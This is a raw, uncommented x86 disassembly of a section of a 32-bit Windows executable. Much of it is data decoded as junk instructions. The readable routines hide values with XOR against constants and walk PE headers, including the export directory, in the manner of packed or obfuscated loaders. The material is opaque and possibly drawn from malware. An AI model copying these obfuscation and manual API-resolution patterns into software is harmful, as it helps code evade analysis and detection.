  4236fc:	pop    ss
  4236fd:	mov    bh,0x45
  4236ff:	pop    ds
  423700:	iret   
  423701:	les    ebp,FWORD PTR [eax+0x746f649e]
  423707:	mov    ?,esi
  423709:	je     0x423788
  42370b:	and    dh,dl
  42370d:	cmovnp esp,DWORD PTR [esi+0x63]
  423711:	sti    
  423712:	fimul  WORD PTR [esi]
  423714:	ins    DWORD PTR es:[edi],dx
  423715:	xlat   BYTE PTR ds:[ebx]
  423716:	out    0xbe,al
  423718:	xchg   esp,eax
  423719:	adc    BYTE PTR [ecx-0x5ad81174],bh
  42371f:	cmp    al,0x13
  423721:	xor    al,0xea
  423723:	(bad)  [ecx-0x262b2b6b]
  423729:	(bad)  
  42372a:	mov    al,0xc8
  42372c:	loopne 0x4236d5
  42372e:	mov    dl,0x3e
  423730:	jae    0x423760
  423732:	test   eax,0x5ecacdd6
  423737:	out    dx,al
  423738:	sub    bl,bh
  42373a:	repz sbb al,0x77
  42373d:	cmp    DWORD PTR [ecx],edx
  42373f:	sbb    ch,BYTE PTR [ecx+0x2a]
  423742:	inc    edx
  423743:	test   BYTE PTR [ebx],bh
  423745:	je     0x42375a
  423747:	or     al,0x1e
  423749:	dec    edx
  42374a:	scas   al,BYTE PTR es:[edi]
  42374b:	call   0x3e8d:0xefe17a39
  423752:	xor    dl,BYTE PTR [esi]
  423754:	out    dx,al
  423755:	iret   
  423756:	push   esi
  423757:	xchg   edx,eax
  423758:	arpl   WORD PTR [ebp+0x25],bp
  42375b:	rcl    bh,cl
  42375d:	xchg   edi,eax
  42375e:	pop    ecx
  42375f:	dec    edx
  423760:	xchg   esp,eax
  423761:	lock and BYTE PTR [ebx],ah
  423764:	rcr    BYTE PTR [edi],cl
  423766:	imul   ecx,DWORD PTR [edx-0x15],0xdc0dd40e
  42376d:	leave  
  42376e:	push   ds
  42376f:	adc    dl,bh
  423771:	fsub   DWORD PTR [ecx-0x1c]
  423774:	imul   edx,esp,0xffffffc0
  423777:	pusha  
  423778:	shr    DWORD PTR [esi+0x143b7b0b],1
  42377e:	cmp    BYTE PTR [ebx+eax*4-0x3a175849],al
  423785:	outs   dx,BYTE PTR ds:[esi]
  423786:	lock or eax,0x9a27eaa9
  42378c:	xchg   edx,eax
  42378d:	in     al,0x70
  42378f:	sbb    edi,0x8b8c494f
  423795:	jo     0x4237db
  423797:	or     eax,0x3e6c799c
  42379c:	aas    
  42379d:	adc    edi,edi
  42379f:	out    0x1d,al
  4237a1:	push   edx
  4237a2:	int    0x5c
  4237a4:	jmp    0x53f1f041
  4237a9:	jbe    0x423787
  4237ab:	pop    ebx
  4237ac:	ins    DWORD PTR es:[edi],dx
  4237ad:	int3   
  4237ae:	dec    ecx
  4237af:	nop
  4237b0:	mov    WORD PTR [ebx],?
  4237b2:	inc    esp
  4237b3:	call   0x6769c64e
  4237b8:	jno    0x423786
  4237ba:	int3   
  4237bb:	sbb    eax,0xd3526fb6
  4237c0:	xchg   BYTE PTR [ebx+0x4e],ah
  4237c3:	addr16 leave 
  4237c5:	mov    al,0xbb
  4237c7:	push   ebx
  4237c8:	add    eax,0xf187002a
  4237cd:	call   0x469bce71
  4237d2:	leave  
  4237d3:	push   ss
  4237d4:	jge    0x4237d2
  4237d6:	sub    al,0x13
  4237d8:	aas    
  4237d9:	(bad)  
  4237da:	popf   
  4237db:	mov    bh,0x71
  4237dd:	rol    BYTE PTR [esi-0x969758f],1
  4237e3:	nop
  4237e4:	ins    BYTE PTR es:[edi],dx
  4237e5:	and    al,0x47
  4237e7:	xchg   BYTE PTR [esi],ah
  4237e9:	fstp   QWORD PTR [esp+ebx*8+0x2d]
  4237ed:	sbb    esi,DWORD PTR [eax]
  4237ef:	mov    dl,0xbe
  4237f1:	loopne 0x423825
  4237f3:	test   BYTE PTR cs:[ecx-0x36a00cc9],ch
  4237fa:	gs jmp 0xfea6c642
  423800:	push   0xb1e3c9ad
  423805:	dec    esp
  423806:	pop    ss
  423807:	mov    ah,0xfe
  423809:	retf   
  42380a:	mov    ch,0xc
  42380c:	icebp  
  42380d:	xchg   esp,eax
  42380e:	add    BYTE PTR [eax+edi*2-0x1703f137],0x33
  423816:	cdq    
  423817:	rol    ebp,1
  423819:	rcl    DWORD PTR [edi+ecx*4],0x3d
  42381d:	ja     0x423842
  42381f:	test   eax,0xcb0b5d85
  423824:	dec    edx
  423825:	lea    esi,[edx]
  423827:	xor    al,0xb3
  423829:	sbb    dh,BYTE PTR [eax+esi*4-0x790822f1]
  423830:	xor    al,0x76
  423832:	xor    al,0xae
  423834:	ret    
  423835:	pop    edi
  423836:	call   0x5336a1c4
  42383b:	and    al,0x35
  42383d:	je     0x4237d6
  42383f:	rol    BYTE PTR [edi+ecx*1],cl
  423842:	fsub   st,st(1)
  423844:	mov    esp,0x96f0eb3c
  423849:	push   ecx
  42384a:	imul   DWORD PTR [ebx]
  42384c:	sbb    BYTE PTR [ebx+0x5e],al
  42384f:	ins    DWORD PTR es:[di],dx
  423851:	dec    DWORD PTR [edx-0x70e4d69f]
  423857:	je     0x4238ba
  423859:	lods   al,BYTE PTR ds:[esi]
  42385a:	jle    0x4238b4
  42385c:	scas   al,BYTE PTR es:[edi]
  42385d:	mov    edi,0x6bee96e9
  423862:	add    dl,al
  423864:	xchg   edi,eax
  423865:	sub    eax,0x6dbf4f00
  42386a:	push   edi
  42386b:	in     al,dx
  42386c:	cld    
  42386d:	sti    
  42386e:	test   BYTE PTR [edi],0xac
  423871:	push   edx
  423872:	and    bl,BYTE PTR [eax]
  423874:	in     eax,dx
  423875:	xor    eax,0x2c41d3f1
  42387a:	dec    ecx
  42387b:	retf   
  42387c:	adc    esi,ebp
  42387e:	cmp    al,0x53
  423880:	cld    
  423881:	data16 fadd st,st(3)
  423884:	sbb    al,0xbb
  423886:	mov    dh,0xcf
  423888:	icebp  
  423889:	or     ch,BYTE PTR fs:[ebx+0x637f989f]
  423890:	and    al,0xb5
  423892:	leave  
  423893:	push   ebx
  423894:	adc    ebp,DWORD PTR [eax+edi*2+0x41]
  423898:	ret    0x16c8
  42389b:	mov    edi,0x785e619d
  4238a0:	mov    al,BYTE PTR [edi]
  4238a2:	in     eax,0xcf
  4238a4:	or     BYTE PTR [edx-0x6d],0x34
  4238a8:	or     eax,0x527b141d
  4238ad:	push   ecx
  4238ae:	push   esp
  4238af:	imul   DWORD PTR [esi-0x63]
  4238b2:	xchg   edx,eax
  4238b3:	loopne 0x423928
  4238b5:	or     ch,ch
  4238b7:	repnz test DWORD PTR [esp+ebp*1-0x29639b8e],eax
  4238bf:	jg     0x42388b
  4238c1:	rcr    BYTE PTR [edx+0x26],cl
  4238c4:	les    ebp,FWORD PTR [ebp-0x34e41a84]
  4238ca:	retf   0x4fdb
  4238cd:	sti    
  4238ce:	xchg   BYTE PTR [ecx],cl
  4238d0:	retf   
  4238d1:	vpmadcswd ymm7,ymm3,ymm2,YMMWORD PTR [edi+eax*4+0x35]
  4238d9:	sub    al,0x45
  4238db:	test   BYTE PTR [edi+edx*2+0x38],dh
  4238df:	fldlg2 
  4238e1:	fs xchg esi,eax
  4238e3:	cmp    DWORD PTR [ebx+0x6],ebx
  4238e6:	hlt    
  4238e7:	clc    
  4238e8:	jne    0x42388c
  4238ea:	jp     0x4238fa
  4238ec:	imul   edx,DWORD PTR [ebx-0x505ca08e],0x6a
  4238f3:	and    bl,bh
  4238f5:	nop
  4238f6:	or     edx,DWORD PTR [eax-0xfcdeeea]
  4238fc:	(bad)  [ebp+0x6ff7ee9f]
  423902:	xor    ebx,DWORD PTR [edx-0x406b21f2]
  423908:	bound  ebp,QWORD PTR ds:[ecx+eiz*2-0x3fbcfed0]
  423910:	dec    edx
  423911:	hlt    
  423912:	pop    esp
  423913:	dec    ebx
  423914:	mov    esp,0xba5d1cd6
  423919:	xchg   ecx,eax
  42391a:	push   ss
  42391b:	arpl   si,dx
  42391d:	push   es
  42391e:	fidivr WORD PTR ds:[esi+0x9d2b5e0]
  423925:	bound  esp,QWORD PTR [eax-0x12]
  423928:	dec    ebp
  423929:	mov    edi,0x6421f3c3
  42392e:	test   al,0x1
  423930:	fcomip st,st(7)
  423932:	addr16 jge 0x423925
  423935:	adc    ebx,edi
  423937:	and    ebp,edx
  423939:	mov    esp,0xdd371ff6
  42393e:	cdq    
  42393f:	shr    bl,0x4
  423942:	mov    esp,0x460956a3
  423947:	add    eax,0x5d65f3c
  42394c:	jne    0x423934
  42394e:	ret    
  42394f:	test   BYTE PTR [edi-0x4ff189a9],ah
  423955:	outs   dx,DWORD PTR ds:[esi]
  423956:	dec    esi
  423957:	dec    esp
  423958:	cli    
  423959:	pop    ecx
  42395a:	fwait
  42395b:	imul   BYTE PTR [edx]
  42395d:	lock add DWORD PTR [edx+esi*2+0x731ca12d],ebp
  423965:	sbb    eax,0xed9c2cef
  42396a:	ftst   
  42396c:	fs mov dh,0x56
  42396f:	xlat   BYTE PTR ds:[ebx]
  423970:	push   edi
  423971:	outs   dx,DWORD PTR ds:[esi]
  423972:	rol    BYTE PTR [edi],1
  423974:	pop    ds
  423975:	(bad)  
  423976:	cdq    
  423977:	xor    ch,dh
  423979:	cmp    BYTE PTR [edx-0x419d3a8a],ah
  42397f:	(bad)  
  423980:	sub    al,0x71
  423982:	pop    edx
  423983:	lods   eax,DWORD PTR ds:[esi]
  423984:	sbb    esp,DWORD PTR [ebx+0x5e]
  423987:	xchg   edx,eax
  423988:	das    
  423989:	jmp    0xa97f726a
  42398e:	mov    edx,0xb7e99e30
  423993:	in     eax,dx
  423994:	adc    al,0xe
  423996:	lock push ecx
  423998:	mov    al,ds:0x3e024052
  42399d:	sar    edx,0x1b
  4239a0:	(bad)  
  4239a3:	aas    
  4239a4:	and    bl,al
  4239a6:	cli    
  4239a7:	jo     0x4239c6
  4239a9:	in     eax,0x79
  4239ab:	pop    esp
  4239ac:	xor    esp,DWORD PTR [eax]
  4239ae:	lock jg 0x42394e
  4239b1:	les    ebp,FWORD PTR [ebx+0x6d]
  4239b4:	pusha  
  4239b5:	mov    WORD PTR [edi],ds
  4239b7:	cli    
  4239b8:	fdecstp 
  4239ba:	jns    0x4239e9
  4239bc:	imul   eax,DWORD PTR [ecx],0x42
  4239bf:	aam    0x56
  4239c1:	das    
  4239c2:	into   
  4239c3:	in     eax,0x4a
  4239c5:	mov    bh,0x65
  4239c7:	shr    esi,0x7c
  4239ca:	test   eax,0x2fa21e99
  4239cf:	dec    esp
  4239d0:	sub    al,0x2b
  4239d2:	jl     0x4239c8
  4239d4:	mov    WORD PTR [ebp+eax*2+0x6b707628],fs
  4239db:	iret   
  4239dc:	fld    DWORD PTR ds:0xba30cd2e
  4239e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239e3:	push   ebx
  4239e4:	adc    al,0x5
  4239e6:	sbb    DWORD PTR [ecx+0xf],ebx
  4239e9:	or     eax,0xe52f45bb
  4239ee:	mov    ds:0x604fd038,eax
  4239f3:	inc    edi
  4239f4:	not    DWORD PTR [edx-0x6b243691]
  4239fa:	mov    dl,BYTE PTR [eax+0x45]
  4239fd:	jmp    0x1cd7:0x6685d8d8
  423a04:	pusha  
  423a05:	jo     0x423a38
  423a07:	sbb    BYTE PTR [edx],0x96
  423a0a:	pop    eax
  423a0b:	mul    bh
  423a0d:	xchg   edx,eax
  423a0e:	sbb    DWORD PTR [eax],esi
  423a10:	push   0x9161422a
  423a15:	rcl    BYTE PTR [eax],cl
  423a17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a18:	and    DWORD PTR [eax],esi
  423a1a:	sub    BYTE PTR [ebp+0x4e],0xd1
  423a1e:	(bad)  
  423a1f:	out    0x9f,al
  423a21:	fs in  al,dx
  423a23:	push   eax
  423a24:	xor    edx,DWORD PTR [ebx-0x57fcdbb1]
  423a2a:	jne    0x4239d5
  423a2c:	out    0x49,al
  423a2e:	ins    DWORD PTR es:[edi],dx
  423a2f:	push   eax
  423a30:	jo     0x4239de
  423a32:	jmp    0x33bf:0x293b6fab
  423a39:	idiv   BYTE PTR [ebx+0x47]
  423a3c:	bound  edi,QWORD PTR [ecx]
  423a3e:	stos   DWORD PTR es:[edi],eax
  423a3f:	cmp    DWORD PTR [edi-0x5a7e3fb5],esp
  423a45:	int3   
  423a46:	mov    dh,0x9a
  423a48:	rol    DWORD PTR [ebp-0x4f76de25],cl
  423a4e:	dec    ebp
  423a4f:	push   ebx
  423a50:	ret    0xd1a0
  423a53:	mov    ch,0xec
  423a55:	pop    ebx
  423a56:	and    ecx,ecx
  423a58:	fstp   TBYTE PTR [ebx+0x40b38828]
  423a5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a5f:	lea    esi,[edx-0x6c]
  423a62:	cmc    
  423a63:	and    al,0x7b
  423a65:	jp     0x4239f2
  423a67:	push   ebp
  423a68:	clc    
  423a69:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  423a71:	mov    edx,DWORD PTR [ebp-0x54]
  423a74:	xor    edx,esi
  423a76:	lea    eax,[edx+eax*1+0x3272db]
  423a7d:	movzx  edx,BYTE PTR [ebp-0x1]
  423a81:	xor    edx,eax
  423a83:	mov    BYTE PTR [ebp-0x1],dl
  423a86:	mov    al,BYTE PTR [ebp-0x1]
  423a89:	mov    edx,DWORD PTR [ebp-0x1c]
  423a8c:	mov    ebx,DWORD PTR [ebp-0xc]
  423a8f:	xor    edx,esi
  423a91:	add    edx,edi
  423a93:	imul   edx,ebx
  423a96:	mov    ebx,DWORD PTR [ebp-0x8]
  423a99:	mov    BYTE PTR [edx+ebx*1],al
  423a9c:	mov    eax,DWORD PTR [ebp-0x30]
  423a9f:	mov    edx,DWORD PTR [ebp-0x3c]
  423aa2:	xor    eax,esi
  423aa4:	xor    edx,esi
  423aa6:	add    eax,edi
  423aa8:	add    edx,edi
  423aaa:	imul   eax,edx
  423aad:	add    eax,DWORD PTR [ebp-0xc]
  423ab0:	mov    DWORD PTR [ebp-0xc],eax
  423ab3:	mov    eax,DWORD PTR [ebp-0xc]
  423ab6:	mov    edx,DWORD PTR [ebp-0x24]
  423ab9:	cmp    edx,eax
  423abb:	jb     0x41e9a5
  423ac1:	mov    eax,DWORD PTR [ebp-0x3c]
  423ac4:	mov    edx,DWORD PTR [ebp-0x24]
  423ac7:	xor    eax,esi
  423ac9:	add    eax,edi
  423acb:	imul   eax,edx
  423ace:	mov    edx,DWORD PTR [ebp-0x20]
  423ad1:	xor    edx,esi
  423ad3:	add    edx,edi
  423ad5:	or     eax,edx
  423ad7:	mov    edx,DWORD PTR [ebp-0x18]
  423ada:	xor    edx,esi
  423adc:	add    eax,edx
  423ade:	mov    edx,DWORD PTR [ebp-0x18]
  423ae1:	xor    edx,esi
  423ae3:	add    eax,edx
  423ae5:	mov    edx,DWORD PTR [ebp-0x10]
  423ae8:	lea    eax,[eax+edx*1+0x64e5b6]
  423aef:	jmp    0x423b03
  423af4:	mov    eax,DWORD PTR [ebp-0x18]
  423af7:	mov    edx,DWORD PTR [ebp-0x10]
  423afa:	xor    eax,esi
  423afc:	lea    eax,[eax+edx*1+0x3272db]
  423b03:	mov    DWORD PTR [ebp-0x10],eax
  423b06:	jmp    0x41e8f2
  423b0b:	mov    eax,DWORD PTR [ebp-0x38]
  423b0e:	mov    edx,DWORD PTR [ebp+0xc]
  423b11:	xor    edx,esi
  423b13:	lea    ecx,[ecx+edx*1+0x3272db]
  423b1a:	lea    edx,[ecx-0x3272db]
  423b20:	xor    edx,esi
  423b22:	cmp    edx,0xf89c95b6
  423b28:	jne    0x41e770
  423b2e:	mov    ecx,DWORD PTR [ebp+0x8]
  423b31:	mov    edx,DWORD PTR [ebp+0xc]
  423b34:	mov    ebx,DWORD PTR [ebp+0x8]
  423b37:	xor    edx,esi
  423b39:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  423b40:	xor    ecx,esi
  423b42:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  423b49:	xor    ebx,esi
  423b4b:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  423b52:	mov    edx,DWORD PTR [ebp+0xc]
  423b55:	xor    edx,esi
  423b57:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  423b5e:	mov    eax,DWORD PTR [ebp+0xc]
  423b61:	xor    eax,esi
  423b63:	add    eax,edi
  423b65:	pop    edi
  423b66:	pop    esi
  423b67:	pop    ebx
  423b68:	leave  
  423b69:	ret    0x8
  423b6c:	push   ebp
  423b6d:	mov    ebp,esp
  423b6f:	push   ecx
  423b70:	mov    eax,ds:0x42c008
  423b75:	xor    DWORD PTR ds:0x42c000,eax
  423b7b:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  423b82:	mov    eax,DWORD PTR [ebp+0x8]
  423b85:	sbb    DWORD PTR ds:0x42d010,0x5f50
  423b8f:	mov    al,BYTE PTR [eax]
  423b91:	add    DWORD PTR ds:0x429020,0x42b018
  423b9b:	add    al,0xd
  423b9d:	xor    DWORD PTR ds:0x42901c,0x429000
  423ba7:	xor    al,0x6f
  423ba9:	mov    DWORD PTR ds:0x42d008,0x56e
  423bb3:	cmp    al,0x35
  423bb5:	mov    DWORD PTR ds:0x42c000,0x518
  423bbf:	jne    0x423c3a
  423bc5:	mov    eax,DWORD PTR [ebp+0x8]
  423bc8:	mov    edx,DWORD PTR ds:0x429014
  423bce:	or     DWORD PTR ds:0x429010,edx
  423bd4:	mov    ecx,DWORD PTR [ebp+0x8]
  423bd7:	add    ecx,DWORD PTR [eax+0x3c]
  423bda:	mov    edx,0x7510893
  423bdf:	adc    eax,DWORD PTR ds:0x42c01c
  423be5:	mov    DWORD PTR [ebp+0x8],ecx
  423be8:	mov    eax,DWORD PTR [ebp-0x4]
  423beb:	xor    eax,edx
  423bed:	adc    ecx,0x2aad
  423bf3:	push   esi
  423bf4:	add    DWORD PTR ds:0x42d01c,0x22ba
  423bfe:	mov    esi,DWORD PTR [ebp+0x8]
  423c01:	xor    ecx,ecx
  423c03:	xor    ecx,DWORD PTR ds:0x42901c
  423c09:	xor    ecx,DWORD PTR ds:0x42a010
  423c0f:	mov    DWORD PTR ds:0x42901c,ecx
  423c15:	mov    ecx,0x3272db
  423c1a:	add    eax,ecx
  423c1c:	cmp    DWORD PTR [esi+0x54],eax
  423c1f:	pop    esi
  423c20:	je     0x423c2e
  423c26:	mov    eax,DWORD PTR [ebp+0x8]
  423c29:	jmp    0x423c47
  423c2e:	mov    eax,DWORD PTR [ebp-0x4]
  423c31:	xor    eax,edx
  423c33:	add    eax,ecx
  423c35:	jmp    0x423c47
  423c3a:	mov    eax,DWORD PTR [ebp-0x4]
  423c3d:	xor    eax,0x7510893
  423c42:	add    eax,0x3272db
  423c47:	leave  
  423c48:	ret    0x4
  423c4b:	push   ebp
  423c4c:	mov    ebp,esp
  423c4e:	push   ecx
  423c4f:	sub    DWORD PTR ds:0x42d010,0x2dcc
  423c59:	push   ecx
  423c5a:	and    DWORD PTR ds:0x42d014,0x0
  423c64:	jmp    0x423c78
  423c69:	xor    edx,edx
  423c6b:	add    edx,DWORD PTR ds:0x42d014
  423c71:	inc    edx
  423c72:	mov    DWORD PTR ds:0x42d014,edx
  423c78:	cmp    DWORD PTR ds:0x42d014,0x1d
  423c7f:	jae    0x423cb6
  423c85:	cmp    DWORD PTR ds:0x42d014,0x26
  423c8c:	jne    0x423cb1
  423c92:	push   0x643f
  423c97:	push   DWORD PTR [ebp-0x24]
  423c9a:	push   0x42a010
  423c9f:	push   DWORD PTR [ebp-0xc]
  423ca2:	push   DWORD PTR [ebp-0x10]
  423ca5:	push   DWORD PTR [ebp-0x10]
  423ca8:	push   DWORD PTR [ebp-0x28]
  423cab:	call   DWORD PTR ds:0x42502c
  423cb1:	jmp    0x423c69
  423cb6:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  423cbd:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  423cc4:	dec    eax
  423cc5:	mov    eax,DWORD PTR [ebp-0x4]
  423cc8:	add    edx,0x6ccb
  423cce:	push   esi
  423ccf:	mov    esi,DWORD PTR [ebp-0x8]
  423cd2:	adc    DWORD PTR ds:0x42a00c,ebx
  423cd8:	mov    edx,0x7510893
  423cdd:	sbb    DWORD PTR ds:0x42c018,0x5978
  423ce7:	xor    eax,edx
  423ce9:	sbb    DWORD PTR ds:0x42901c,0x3646
  423cf3:	xor    esi,edx
  423cf5:	sub    DWORD PTR ds:0x429014,0x4430
  423cff:	mov    ecx,0x3272db
  423d04:	sbb    DWORD PTR ds:0x42d01c,0x42900c
  423d0e:	add    esi,ecx
  423d10:	mov    DWORD PTR ds:0x42a010,0x31b3
  423d1a:	add    eax,ecx
  423d1c:	inc    DWORD PTR ds:0x42c01c
  423d22:	imul   eax,esi
  423d25:	mov    esi,DWORD PTR [ebp+0xc]
  423d28:	mov    DWORD PTR ds:0x429028,0xd41
  423d32:	cmp    esi,eax
  423d34:	jne    0x423d52
  423d3a:	and    esi,eax
  423d3c:	mov    eax,DWORD PTR [ebp-0x4]
  423d3f:	mov    esi,DWORD PTR [ebp-0x8]
  423d42:	xor    eax,edx
  423d44:	xor    esi,edx
  423d46:	add    eax,ecx
  423d48:	add    esi,ecx
  423d4a:	imul   eax,esi
  423d4d:	jmp    0x423d8d
  423d52:	mov    eax,DWORD PTR [ebp+0xc]
  423d55:	mov    eax,DWORD PTR [eax+0x78]
  423d58:	mov    DWORD PTR [ebp+0xc],eax
  423d5b:	mov    eax,DWORD PTR [ebp-0x4]
  423d5e:	mov    esi,DWORD PTR [ebp-0x8]
  423d61:	xor    eax,edx
  423d63:	xor    esi,edx
  423d65:	add    eax,ecx
  423d67:	add    esi,ecx
  423d69:	imul   eax,esi
  423d6c:	mov    esi,DWORD PTR [ebp+0xc]
  423d6f:	cmp    esi,eax
  423d71:	mov    eax,DWORD PTR [ebp-0x4]
  423d74:	je     0x423d3f
  423d7a:	xor    eax,edx
  423d7c:	add    eax,ecx
  423d7e:	mov    ecx,DWORD PTR [ebp+0xc]
  423d81:	imul   eax,ecx
  423d84:	add    eax,DWORD PTR [ebp+0x8]
  423d87:	mov    DWORD PTR [ebp+0xc],eax
  423d8a:	mov    eax,DWORD PTR [ebp+0xc]
  423d8d:	pop    esi
  423d8e:	leave  
  423d8f:	ret    0x8
  423d92:	add    BYTE PTR [eax-0x5ffbffbe],ah
  423d98:	inc    edx
  423d99:	add    BYTE PTR [eax],cl
  423d9b:	mov    al,ds:0xa00c0042
  423da0:	inc    edx
  423da1:	add    BYTE PTR [eax],dl
  423da3:	mov    al,ds:0xa0140042
  423da8:	inc    edx
  423da9:	add    BYTE PTR [eax],bl
  423dab:	mov    al,ds:0xa01c0042
  423db0:	inc    edx
  423db1:	add    BYTE PTR [eax],al
  423db3:	mov    al,0x42
  423db5:	add    BYTE PTR [eax+esi*4],al
  423db8:	inc    edx
  423db9:	add    BYTE PTR [eax],cl
  423dbb:	mov    al,0x42
  423dbd:	add    BYTE PTR [eax+esi*4],cl
  423dc0:	inc    edx
  423dc1:	add    BYTE PTR [eax],dl
  423dc3:	mov    al,0x42
  423dc5:	add    BYTE PTR [eax+esi*4],dl
  423dc8:	inc    edx
  423dc9:	add    BYTE PTR [eax],bl
  423dcb:	mov    al,0x42
  423dcd:	add    BYTE PTR [eax+esi*4],bl
  423dd0:	inc    edx
  423dd1:	add    BYTE PTR [eax],al
  423dd3:	rol    BYTE PTR [edx+0x0],0x4
  423dd7:	rol    BYTE PTR [edx+0x0],0x8
  423ddb:	rol    BYTE PTR [edx+0x0],0xc
  423ddf:	rol    BYTE PTR [edx+0x0],0x10
  423de3:	rol    BYTE PTR [edx+0x0],0x14
  423de7:	rol    BYTE PTR [edx+0x0],0x18
  423deb:	rol    BYTE PTR [edx+0x0],0x1c
  423def:	rol    BYTE PTR [edx+0x0],0x75
  423df3:	ins    DWORD PTR es:[edi],dx
  423df4:	push   ecx
  423df5:	push   eax
  423df6:	jo     0x423e72
  423df8:	addr16 jo 0x423e51
  423dfb:	pop    eax
  423dfc:	inc    ebp
  423dfd:	push   edx
  423dfe:	jb     0x423e74
  423e00:	inc    esi
  423e01:	je     0x423e4a
  423e03:	gs ins BYTE PTR es:[edi],dx
  423e05:	dec    esp
  423e06:	js     0x423e70
  423e08:	inc    edx
  423e09:	js     0x423e51
  423e0b:	arpl   WORD PTR [edx+0x66],ax
  423e0e:	inc    ebx
  423e0f:	push   ebp
  423e10:	jno    0x423e88
  423e12:	scas   al,BYTE PTR es:[edi]
  423e13:	inc    ecx
  423e14:	inc    edx
  423e15:	add    BYTE PTR [esi+0x5a004241],dh
  423e1b:	inc    eax
  423e1c:	inc    edx
  423e1d:	add    bh,ch
  423e1f:	or     esi,DWORD PTR [edx+0x304e790e]
  423e25:	dec    esi
  423e26:	xchg   DWORD PTR [edi+0x3d],ecx
  423e29:	dec    esi
  423e2a:	scas   eax,DWORD PTR es:[edi]
  423e2b:	dec    edi
  423e2c:	ds dec esi
  423e2e:	js     0x423e7e
  423e30:	cmp    ecx,DWORD PTR [esi-0x64]
  423e33:	dec    edi
  423e34:	inc    esp
  423e35:	dec    esi
  423e36:	jae    0x423e86
  423e38:	inc    ecx
  423e39:	dec    esi
  423e3a:	xor    BYTE PTR [esi+0x40],cl
  423e3d:	dec    esi
  423e3e:	pop    esp
  423e3f:	pop    ebp
  423e40:	pop    edi
  423e41:	push   edx
  423e42:	cmp    DWORD PTR [esi+0x79],ecx
  423e45:	dec    esi
  423e46:	xor    BYTE PTR [esi-0x79],cl
  423e49:	dec    edi
  423e4a:	cmp    eax,0x3e4faf4e
  423e4f:	dec    esi
  423e50:	js     0x423ea0
  423e52:	cmp    ecx,DWORD PTR [esi-0x64]
  423e55:	dec    edi
  423e56:	inc    esp
  423e57:	dec    esi
  423e58:	mov    DWORD PTR [edi+0x41],ecx
  423e5b:	dec    esi
  423e5c:	xor    BYTE PTR [esi+0x40],cl
  423e5f:	dec    esi
  423e60:	pop    esp
  423e61:	ins    DWORD PTR es:[edi],dx
  423e62:	pop    edi
  423e63:	bound  edi,QWORD PTR [ecx]
  423e65:	dec    esi
  423e66:	jns    0x423eb6
  423e68:	xor    BYTE PTR [esi-0x80],cl
  423e6b:	dec    edi
  423e6c:	cmp    eax,0x394e734e
  423e71:	dec    esi
  423e72:	mov    ds:0x304e3a4f,al
  423e77:	dec    esi
  423e78:	inc    esi
  423e79:	dec    esi
  423e7a:	pop    esp
  423e7b:	jge    0x423edc
  423e7d:	jb     0x423eee
  423e7f:	sub    BYTE PTR [esi-0x7d],0x7e
  423e83:	xchg   ebx,eax
  423e84:	jns    0x423e16
  423e86:	aas    
  423e87:	dec    esi
  423e88:	test   BYTE PTR [edi+0x30],cl
  423e8b:	dec    esi
  423e8c:	test   BYTE PTR [edi+0x3c],cl
  423e8f:	dec    esi
  423e90:	mov    ds:0x734e394f,al
  423e95:	dec    esi
  423e96:	inc    ebp
  423e97:	dec    esi
  423e98:	xor    BYTE PTR [esi+0x44],cl
  423e9b:	dec    esi
  423e9c:	pop    esp
  423e9d:	lea    ebx,[edi-0x7e]
  423ea0:	outs   dx,DWORD PTR ds:[esi]
  423ea1:	xchg   edx,eax
  423ea2:	outs   dx,BYTE PTR ds:[esi]
  423ea3:	xchg   ebx,eax
  423ea4:	jle    0x423e49
  423ea6:	jns    0x423e48
  423ea8:	aas    
  423ea9:	dec    esi
  423eaa:	test   BYTE PTR [edi+0x30],cl
  423ead:	dec    esi
  423eae:	test   BYTE PTR [edi+0x3c],cl
  423eb1:	dec    esi
  423eb2:	mov    ds:0x894e394f,al
  423eb7:	dec    edi
  423eb8:	inc    ebp
  423eb9:	dec    esi
  423eba:	xor    BYTE PTR [esi+0x44],cl
  423ebd:	dec    esi
  423ebe:	pop    esp
  423ebf:	popf   
  423ec0:	pop    edi
  423ec1:	xchg   edx,eax
  423ec2:	outs   dx,DWORD PTR ds:[esi]
  423ec3:	mov    ds:0xb37ea36e,al
  423ec8:	jns    0x423e7a
  423eca:	aas    
  423ecb:	dec    esi
  423ecc:	mov    cs,WORD PTR [edi+0x30]
  423ecf:	dec    esi
  423ed0:	lods   al,BYTE PTR ds:[esi]
  423ed1:	dec    edi
  423ed2:	cmp    eax,0x394e734e
  423ed7:	dec    esi
  423ed8:	mov    eax,ds:0x304e3a4f
  423edd:	dec    esi
  423ede:	inc    esp
  423edf:	dec    esi
  423ee0:	pop    esp
  423ee1:	lods   eax,DWORD PTR ds:[esi]
  423ee2:	pop    edi
  423ee3:	mov    ds:0xb36eb26f,al
  423ee8:	jle    0x423ead
  423eea:	jns    0x423eac
  423eec:	aas    
  423eed:	dec    esi
  423eee:	mov    cs,WORD PTR [edi+0x30]
  423ef1:	dec    esi
  423ef2:	lods   al,BYTE PTR ds:[esi]
  423ef3:	dec    edi
  423ef4:	cmp    eax,0x394e7e4e
  423ef9:	dec    esi
  423efa:	lahf   
  423efb:	dec    edi
  423efc:	cmp    ecx,DWORD PTR [esi+0x30]
  423eff:	dec    esi
  423f00:	inc    ebp
  423f01:	dec    esi
  423f02:	pop    esp
  423f03:	mov    ebp,0xc26fb25f
  423f08:	outs   dx,BYTE PTR ds:[esi]
  423f09:	ret    
  423f0a:	jle    0x423edf
  423f0c:	jns    0x423ede
  423f0e:	aas    
  423f0f:	dec    esi
  423f10:	mov    cs,WORD PTR [edi+0x30]
  423f13:	dec    esi
  423f14:	lods   al,BYTE PTR ds:[esi]
  423f15:	dec    edi
  423f16:	cmp    eax,0x394f804e
  423f1b:	dec    esi
  423f1c:	lods   al,BYTE PTR ds:[esi]
  423f1d:	dec    edi
  423f1e:	cmp    cl,BYTE PTR [esi+0x30]
  423f21:	dec    esi
  423f22:	inc    esi
  423f23:	dec    esi
